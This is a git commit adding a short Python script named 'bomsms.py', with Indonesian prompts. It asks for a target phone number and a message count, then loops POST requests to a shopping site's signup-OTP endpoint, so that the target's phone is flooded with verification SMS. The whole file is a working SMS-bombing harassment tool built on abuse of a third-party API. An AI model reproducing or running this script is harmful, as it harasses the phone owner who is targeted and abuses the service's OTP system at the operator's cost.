88effec2d7882b0133efc9ad7a72f3b230aa0ecc
linuxkukeren <linuxkukeren@gmail.com>
2020-12-31 15:14:20 +0800

    first commit

---
+++ bomsms.py
@@ -0,0 +1,14 @@
+import requests
+
+no = int(input('masukan no target : '))
+jum = int(input('masukan jumlah pesan : '))
+
+json = {'phone' :no}
+jumlahpes = 0
+for res in range(jum):
+    res = requests.post('https://cmsapi.mapclub.com/api/signup-otp',json=json)
+    if "ok" in res.text :
+        jumlahpes +=1
+        print(jumlahpes,'pesan berhasil dikirim')
+    else:
+        print('maaf ada eror ===>> ', res.text)
